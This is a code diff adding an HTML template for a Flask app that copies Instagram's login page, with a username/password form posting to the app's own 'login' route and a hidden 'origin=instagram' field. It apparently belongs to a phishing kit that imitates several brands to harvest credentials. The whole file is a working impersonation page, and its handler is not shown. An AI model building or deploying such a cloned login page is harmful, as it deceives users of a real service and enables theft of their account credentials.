@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="fr-FR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="{{ url_for('static', filename='assets/css/main.css') }}">
+  <title>Instagram</title>
+</head>
+<body>
+  <main class="l-main">
+      <div class="l-main__img">
+        <img src="{{ url_for('static', filename='assets/img/homepage.png') }}" alt="Smartphones">
+      </div>
+      <div class="l-user">
+        <div class="c-panel group">
+          <img class="c-panel__img" src="{{ url_for('static', filename='assets/img/instagram.svg') }}" alt="Instagram">
+          <form action="{{ url_for('login') }}" method="post" class="c-panel__form">
+            <input type="hidden" name="origin" value="instagram">
+            <input type="text" name="username" class="c-panel__input" placeholder="Phone number, username, or email" required>
+            <input type="password" name="password" class="c-panel__input" placeholder="Password" required>
+            <button type="submit" class="c-btn">Log In</button>
+            <span class="c-panel__span">OR</span>
+            <a href="#" class="c-panel__facebook">Login with Facebook</a>
+          </form>
+          <a href="#" class="c-panel__forgot">Forgot password?</a>
+        </div>
+        <div class="c-signup group">
+          <p>Don't have an account? <span>Sign up</span></p>
+        </div>
+        <div class="c-app">
+          <p>Get the app.</p>
+          <div class="c-app__download">
+            <img src="{{ url_for('static', filename='assets/img/apple.png') }}" alt="Apple Store">
+            <img src="{{ url_for('static', filename='assets/img/google.png') }}" alt="Google Play">
+          </div>
+        </div>
+      </div>
+  </main>
+</body>
+</html>
